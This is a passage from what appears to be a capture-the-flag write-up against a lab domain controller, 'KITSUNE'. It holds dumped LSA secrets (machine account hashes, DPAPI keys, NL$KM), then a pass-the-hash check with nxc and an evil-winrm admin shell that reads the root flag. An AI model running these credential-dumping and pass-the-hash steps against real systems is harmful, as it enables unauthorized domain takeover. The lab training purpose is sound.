[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
KITSUNE\DC01$:aes256-cts-hmac-sha1-96:54fa75afbd2c8ebc0a7c66d12d6658135ff7cccd6308c6f252d5650ecf3d6142
KITSUNE\DC01$:aes128-cts-hmac-sha1-96:98aee140894c50fc6b9df1f8f45c6bc0
KITSUNE\DC01$:des-cbc-md5:7054e68cadc1e951
KITSUNE\DC01$:plain_password_hex:dec5c211d4babd91e437304c43c778d6de456ecc929c4814883425cf929e33d9eb7d6d0147c801d263a5467ccf340b2b03dcb1c83a5bad6c7ee81391acf12a9c9b4159c736d32c68e301f35a66536423d3ae3416bbde25d75d79755a63c0b4513ebcae2988d8184eb9ab4927901ec4b09e2f1bb861f06474556cff298c08e4be1d38a0b5862d90920def2e5fc1c664adad34b4f2a31f5139cdba68129fe89b70dde6aac1f3e1f818fe6b8ebc70604c27354432e8e7e7970e3f463d0f92919d58ebbd328d52a9edc1eee7cbcec9a18f0cbb718ec6a273a568c76b630a84a820a8a3f467da2f6e4a31021b03b58ccbb021
KITSUNE\DC01$:aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2d3f243818d41c56a5d560c6f9e8e8e91c63cc7e
dpapi_userkey:0xdbc4e9db99118d5c9bbfa64d0ca5c065bfa814b5
[*] NL$KM 
 0000   D6 F9 1E BE 20 95 21 6A  88 22 1F 5C 92 CE 2C 8A   .... .!j.".\..,.
 0010   BB CF 2C 38 59 53 A4 3A  EF A0 03 DA EA A5 A8 CF   ..,8YS.:........
 0020   0E 6F 91 92 02 3E 5B 45  40 E2 C7 A8 D5 DA 8B 11   .o...>[E@.......
 0030   6D 77 6B 5F 3F 78 48 12  0F BF A8 CE 06 C2 C6 7C   mwk_?xH........|
NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
[*] Cleaning up... 
                    
```

#### validating hash so found

```text
                                                                                                                                       
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ nxc winrm 10.1.125.232 -u 'Administrator' -H '2dffec5d0dda0cbc8bf571471641e001'

WINRM       10.1.125.232    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) 
WINRM       10.1.125.232    5985   DC01             [+] kitsune.local\Administrator:2dffec5d0dda0cbc8bf571471641e001 (Pwn3d!)

```

#### We have the root Flag 😃

```text
┌──(kali㉿kali)-[~/Downloads/hacksmarter]
└─$ evil-winrm -i 10.1.125.232 -u 'Administrator' -H '2dffec5d0dda0cbc8bf571471641e001'

                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/13/2026   4:17 AM           1885 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
......................................................................
......................................................................
......................................................................
................................-%@@%-................................
.............................:%@@@@@@@@%:.............................
............................*@@@@@@@@@@@@#............................
...........................%@@@@@@@@@@@@@@@...........................
..........................@@@@@@@@@@@@@@@@@@:.........................
.........................@@@@@%#=-::-=#%@@@@@:........................
........................#@%+-=++=:..:=+++-=%@#........................
.......................=@%@@@-..:*@@#:..-@@@@@+.......................
.......................#@@@@##:::%--%:::##@@@@#.......................
.......................-@@@@+.:::....:::.+@@@@-.......................
........................:@@@@-..........-@@@@:........................
.......................-##*@@@#........#@@@*##=.......................
....................-@@@@@@%%@@@%+::+%@@@%%@@@@@@-....................
...................%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%...................
..................%@@@=------------------------=@@@%..................
.................*@@@#..........................%@@@+.................
.................@@@@@..........................@@@@@.................
................+@@@@@:..........*@@#..........:@@@@@+................
................#@@@@@=..........:@@-..........=@@@@@#................
................*@@@@@*........ranch...........*@@@@@*................
......................%.......obtained.........@......................
......................=@@@@@@@@@@@@@@@@@@@@@@@@=......................
......................................................................

```

**KITSUNE PWNED!** 🔥
